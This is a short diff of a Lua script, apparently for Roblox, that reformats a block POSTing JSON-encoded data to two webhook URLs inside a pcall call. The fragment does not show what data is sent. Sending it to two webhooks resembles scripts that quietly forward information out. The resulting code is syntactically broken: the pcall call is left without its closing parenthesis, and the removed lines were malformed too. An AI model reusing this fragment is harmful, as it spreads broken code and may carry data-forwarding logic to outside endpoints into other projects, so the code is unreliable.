@@ -533,16 +533,15 @@ local requestBody = table.concat(body, "\r\n")
 
 -- Send request
 pcall(function()
-for _, hook in ipairs({Webhook1, Webhook2}) do
-    request({
-        Url = hook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = game:GetService("HttpService"):JSONEncode(data)
+    for _, hook in ipairs({Webhook1, Webhook2}) do
+        request({
+            Url = hook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(data)
         })
-    end)
+    end
 end
-
 
 
 
